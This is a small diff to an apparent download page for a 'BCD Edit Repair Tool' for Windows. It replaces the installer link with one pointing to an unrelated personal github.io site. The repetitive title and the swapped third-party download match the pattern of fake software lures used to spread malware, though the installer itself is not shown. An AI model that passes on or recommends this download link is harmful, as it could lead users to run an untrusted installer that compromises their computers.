@@ -1,6 +1,6 @@
 # BCD Edit Repair Tool Repair Fix Notes
 
-**Download:** [Get Windows installer →](https://bcd-edit-repair-tool.kolmods.com/)
+**Download:** [Get Windows installer →](https://aboda9725.github.io)
 
 ## Download & Install
 
